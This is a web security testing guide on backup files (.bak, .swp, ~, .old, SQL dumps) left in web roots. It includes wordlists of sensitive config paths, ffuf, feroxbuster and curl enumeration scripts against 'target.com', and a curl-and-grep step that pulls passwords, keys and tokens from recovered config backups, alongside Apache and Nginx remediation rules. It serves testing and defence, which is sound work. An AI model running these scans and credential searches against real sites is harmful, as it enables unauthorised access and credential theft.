# Backup Files (.bak, .swp, ~, .old)

## Overview
Backup files are copies of source code, configuration, or data files created by text editors, version control systems, automated backup tools, or developers performing manual backups. When these files are left in the web root, the web server serves them as plain text (bypassing the server-side execution engine) because the file extension no longer maps to an execution handler. A `.php.bak` file is not executed as PHP — it is downloaded as a text file, revealing the full source code including database credentials, API keys, and business logic.

## How It Works
Most common text editors create backup files automatically: vim creates `.swp` and `.swo` files, nano creates backups with a `~` suffix, and some IDEs create `.orig` files. Developers create manual backups like `config.php.bak` before editing. Deployment scripts may leave `config.php.old` when updating. All of these may end up in the web root. Because the web server's PHP/ASP/JSP handler maps based on extension (only `.php` is passed to the PHP interpreter), requesting `config.php.bak` causes the server to send the raw PHP source code to the browser.

## Impact
- Read full server-side source code for any backed-up file
- Extract database credentials from config backups
- Discover API keys, encryption keys, and secrets
- Understand authentication logic to find bypasses
- Map internal routes and endpoints
- Access database dumps if `.sql` backup files are exposed

## Where to Look
- Web root and all application directories
- `/admin/`, `/config/`, `/include/`, `/lib/`, `/src/` directories
- Files named after common sensitive files: `config`, `settings`, `database`, `db`, `env`, `secret`
- Any file with a known name that might have a backup counterpart
- Check after identifying PHP/ASP/Python file names from links or error messages

## Testing Steps
1. Identify source file names from the application (page names, API endpoints, error messages, HTML comments).
2. Append each backup extension to each identified file name and check for HTTP 200 response.
3. Run a directory brute-force with a combined wordlist of filenames + backup extensions.
4. Specifically target sensitive filenames: `config`, `settings`, `database`, `db`, `admin`, `connect`.
5. Check for vim swap files (dot-prefixed, `.swp` extension): `.config.php.swp`, `.index.php.swp`.
6. Look for database dump files: `dump.sql`, `backup.sql`, `database.sql`, `data.sql`.
7. Download any found backup files and search for credentials, keys, and connection strings.

## Payloads / Techniques

```
# === Common Backup File Extensions ===
.bak         .bak2        .backup
.old         .older
.orig        .original
~            (tilde — e.g., index.php~)
.tmp         .temp
.copy        .cp
.sav         .save
.swp         .swo         .swn    (vim swap files)
.1           .2           .3      (numbered backups)
.20231201    (date-stamped)
.tar         .tar.gz      .zip    .gz    .tgz
.rar
.sql         .sql.gz      .sql.bz2
.dump
.dist        (distribution configs — may have production values)

# === Vim Swap File Naming ===
# vim creates: .FILENAME.swp (hidden file)
# Examples:
/.index.php.swp
/.config.php.swp
/.settings.py.swp
/.login.php.swp
/.db.php.swp
# Recover source: vim -r .index.php.swp

# === Common Sensitive File + Extension Combinations ===
/config.php.bak
/config.php~
/config.php.old
/config.php.orig
/config.php.bak2
/settings.php.bak
/database.php.bak
/db.php.bak
/db.php~
/connect.php.bak
/connection.php.bak
/wp-config.php.bak
/wp-config.php~
/wp-config.php.old
/.wp-config.php.swp
/configuration.php.bak   # Joomla
/local.xml.bak            # Magento
/app/etc/local.xml.bak
/sites/default/settings.php.bak  # Drupal

# === Application Configs ===
/application.properties.bak
/application.yml.bak
/.env.bak
/.env.old
/.env~
/.env.orig
/config.yml.bak
/config.json.bak
/appsettings.json.bak
/web.config.bak

# === Database Dumps ===
/dump.sql
/backup.sql
/database.sql
/db_backup.sql
/data.sql
/export.sql
/site.sql
/schema.sql
/backup/database.sql
/backups/db.sql.gz
/sql/dump.sql.gz

# === Archive/Compressed Backups ===
/backup.zip
/backup.tar.gz
/www.zip
/site.tar.gz
/public_html.zip
/html.tar.gz
/DOMAINNAME.zip
/DOMAINNAME.tar.gz

# === Numbered and Date Backups ===
/config.php.1
/config.php.2
/index.php.20230101
/config.20240115.php
/settings.20231201.py

# === IDE and Editor Artifacts ===
# JetBrains (IntelliJ, PHPStorm)
/.idea/workspace.xml
/.idea/dataSources.xml      # Database connections with passwords!
/.idea/dataSources.local.xml

# VS Code
/.vscode/settings.json      # May contain DB/SSH config
/.vscode/launch.json        # May contain credentials for debug targets
```

```bash
# Comprehensive backup file fuzz
# Using ffuf with a combined wordlist
cat > /tmp/backup_fuzz.txt << 'EOF'
config.php.bak
config.php~
config.php.old
config.php.orig
settings.php.bak
database.php.bak
db.php.bak
db.php~
wp-config.php.bak
wp-config.php~
.wp-config.php.swp
.env.bak
.env.old
application.yml.bak
web.config.bak
backup.sql
dump.sql
database.sql
backup.zip
backup.tar.gz
EOF

ffuf -u "https://target.com/FUZZ" \
  -w /tmp/backup_fuzz.txt \
  -mc 200 \
  -t 40 \
  -v

# Generate exhaustive backup file list from known page names
TARGET="https://target.com"
PAGES=("index" "login" "admin" "config" "settings" "database" "db" "connect")
EXTS=(".php.bak" ".php~" ".php.old" ".php.orig" ".bak" ".old" "~" ".swp")
for page in "${PAGES[@]}"; do
  for ext in "${EXTS[@]}"; do
    url="$TARGET/${page}${ext}"
    code=$(curl -s -o /dev/null -w "%{http_code}" "$url")
    [ "$code" = "200" ] && echo "[FOUND] $url"
  done
done

# Download and grep all found backup files
curl -s "https://target.com/config.php.bak" | grep -iE "password|passwd|secret|key|token|api"

# Recover content from vim .swp file
vim -r .config.php.swp
# Or use python:
python3 -c "
import struct, sys
with open('.config.php.swp', 'rb') as f:
    f.seek(0x150)  # Skip swap file header
    data = f.read()
print(data.decode('latin-1', errors='replace'))
"
```

```bash
# SecLists backup file wordlists
# /usr/share/seclists/Discovery/Web-Content/
# Relevant files:
# - raft-large-files.txt
# - Common-PHP-Filenames.txt
# - web-extensions.txt
# - backup-files.txt (if available)

# Use feroxbuster with backup extension appending
feroxbuster -u "https://target.com" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  --extensions bak,old,orig,tmp,backup \
  --status-codes 200,301,302

# Wayback Machine for old backups
echo "target.com" | waybackurls | grep -iE "\.(bak|old|orig|sql|zip|tar|gz|backup)(\?|$)"
```

## Burp Suite Tips
- Use **Target > Site Map** to enumerate all discovered files, then right-click and **Engagement Tools > Find Scripts / Active Scan**.
- In **Intruder**, place the extension position after known filenames: `config.php§§` with an extension list payload.
- **Burp Scanner** (Pro) has a check for backup files — run Active Scan on the entire target scope.
- Use **Proxy > HTTP History** to identify PHP, ASP, or other server-side file names from the application, then manually test backup extensions in Repeater.
- After finding and downloading a backup file, paste the content into Burp's **Decoder** to check for encoding or base64 sections.

## Tools
- Burp Suite Pro (Scanner, Intruder, Content Discovery)
- ffuf — fast backup file enumeration
- feroxbuster — recursive enumeration with extensions
- dirsearch with `--extensions` flag
- SecLists — comprehensive wordlists
- gau / waybackurls — historical URL discovery
- vim `-r` — recover vim swap files
- strings — extract readable content from binary backup files

## Remediation
- Configure the web server to deny access to known backup file extensions at the server level:
  Apache: `<FilesMatch "\.(bak|old|orig|tmp|swp|sql|dump)$"> Require all denied </FilesMatch>`
  Nginx: `location ~* \.(bak|old|orig|tmp|swp|sql)$ { deny all; }`
- Add backup file extensions to `.gitignore` to prevent accidental commits.
- Implement a deployment pipeline that explicitly lists allowed files in the web root — deny everything else by default.
- Never create backup files in the web root; use a separate, non-web-accessible directory.
- Configure vim to store swap files in a central location (`set directory=/tmp//` in `.vimrc`).
- Regularly scan the production web root for unauthorized file types.

## References
https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/05-Review_Old_Backup_and_Unreferenced_Files_for_Sensitive_Information
https://portswigger.net/web-security/information-disclosure/exploiting
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#useful-linux-files
https://cwe.mitre.org/data/definitions/530.html
https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
